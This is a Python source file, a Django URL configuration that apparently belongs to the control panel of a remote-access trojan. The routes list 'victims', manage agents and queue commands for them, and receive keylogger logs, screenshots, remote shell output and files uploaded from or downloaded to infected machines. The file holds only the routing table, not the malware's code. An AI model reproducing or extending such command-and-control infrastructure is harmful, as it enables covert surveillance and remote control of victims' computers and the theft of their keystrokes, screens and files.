# -*- coding: utf-8 -*-
"""
Created on Wed Apr 13 20:11:43 2016

@author: abdelmajid
"""

from django.conf.urls import url #, include
#from django.contrib import admin
from serviceapp import views as viewsSerApp


urlpatterns =[
url(r'^$', viewsSerApp.accueil,name="accueil"),
url(r'^clients/$', viewsSerApp.allVectims,name="clients"),
url(r'^getclient/$', viewsSerApp.get_client,name="getclient"),
url(r'^delclient/$', viewsSerApp.del_client,name="delclient"),
url(r'^modclient/$', viewsSerApp.mod_client,name="modclient"),
url(r'^modcmdclient/$', viewsSerApp.mod_cmd_client,name="modcmdclient"),
url(r'^modexecution/$', viewsSerApp.mod_execution,name="modexecution"),
url(r'^getcmdsclient/$', viewsSerApp.get_cmds_client,name="getcmdsclient"),
url(r'^getallcommandes/$', viewsSerApp.get_all_commandes,name="getallcommandes"),
url(r'^gerercommande/$', viewsSerApp.gerer_commande,name="gerercommande"),
url(r'^execscmdclient/$', viewsSerApp.execusions_cmd_client,name="execscmdclient"),
url(r'^addcmdforms/$', viewsSerApp.ajouter_cmd,name="addcmdforms"),
url(r'^notifications/$', viewsSerApp.notifications,name="notifications"),
url(r'^messages/$', viewsSerApp.allMessages,name="messages"),
url(r'^messageclient/$', viewsSerApp.messagesOfClient),
url(r'^messagenonvue/$', viewsSerApp.messagesNvue,name="msgnonVue"),
url(r'^afficherimages/$', viewsSerApp.imagesscreenclient,name="imgsclienscreencmd"),
url(r'^ajouter/$', viewsSerApp.ajouter,name="ajouterclietOrMessage"),
url(r'^ajouterdon/$', viewsSerApp.ajouterDon,name="Resp"),
url(r'^recept/$', viewsSerApp.reception,name="Recept"),
url(r'^gereragent/$', viewsSerApp.gerer_agent,name="gererAgent"),
url(r'^commandeexecutee/$', viewsSerApp.commande_executee,name="commandeexecutee"),
url(r'^savekeylogger/$', viewsSerApp.save_keylogger_exec,name="save_keylogger_exec"),
url(r'^savescreenshot/$', viewsSerApp.save_screenshot_exec,name="save_screenshot_exec"),
url(r'^saveshell/$', viewsSerApp.save_shell_exec,name="save_shell_exec"),
url(r'^saveupload/$', viewsSerApp.save_upload_exec,name="save_upload_exec"),
url(r'^savedownload/$', viewsSerApp.save_download_exec,name="save_download_exec")
]
